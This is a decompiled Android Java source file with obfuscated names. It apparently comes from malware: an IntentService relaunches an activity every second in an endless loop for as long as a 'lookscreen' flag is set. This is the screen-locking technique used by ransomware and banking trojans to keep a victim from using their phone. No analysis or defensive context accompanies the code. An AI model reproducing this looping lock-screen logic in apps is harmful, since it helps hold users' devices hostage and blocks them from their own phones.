package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;
import android.content.Intent;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.ncec.zjwruw;

/* JADX INFO: loaded from: classes.dex */
public class ttiegryczsx extends IntentService {

    /* JADX INFO: renamed from: a */
    C0020b f571a;

    public ttiegryczsx() {
        super("ttiegryczsx");
        this.f571a = new C0020b();
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        while (true) {
            try {
                TimeUnit.MILLISECONDS.sleep(1000L);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            try {
                startActivity(new Intent(this, (Class<?>) zjwruw.class));
            } catch (Exception unused) {
                this.f571a.m230a("ERROR", "zjwruw");
            }
            if (!this.f571a.m251e(this, "lookscreen").equals("true")) {
                return;
            }
        }
    }
}
